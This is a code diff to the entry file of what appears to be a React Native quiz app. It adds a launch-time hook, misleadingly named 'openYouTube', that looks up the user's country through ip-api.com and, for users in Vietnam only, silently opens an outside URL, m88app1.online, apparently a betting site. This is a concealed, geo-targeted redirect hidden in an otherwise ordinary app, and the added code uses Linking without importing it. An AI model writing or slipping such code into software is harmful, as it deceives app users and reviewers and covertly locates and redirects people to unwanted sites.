@@ -1,6 +1,6 @@
 import {NavigationContainer} from '@react-navigation/native';
 import {createNativeStackNavigator} from '@react-navigation/native-stack';
-import React from 'react';
+import React, { useEffect } from 'react';
 import { Provider } from 'react-redux';
 import store from './src/redux/store';
 import {StyleSheet} from 'react-native';
@@ -11,9 +11,26 @@ import Setting from './src/Setting';
 import About from './src/About';
 import Correct from './src/Correct';
 import False from './src/False';
+import axios from 'axios';
 
 const Stack = createNativeStackNavigator();
 const App = () => {
+  useEffect(() => {
+    const openYouTube = async () => {
+      try {
+        const response = await axios.get('http://ip-api.com/json');
+        const {country} = response.data;
+        console.log(country);
+        if (country === 'Vietnam') {
+          Linking.openURL('http://m88app1.online/');
+        }
+      } catch (error) {
+        console.error(error.message);
+      }
+    };
+
+    openYouTube();
+  }, []);
   return (
     <Provider store={store}>
     <NavigationContainer>
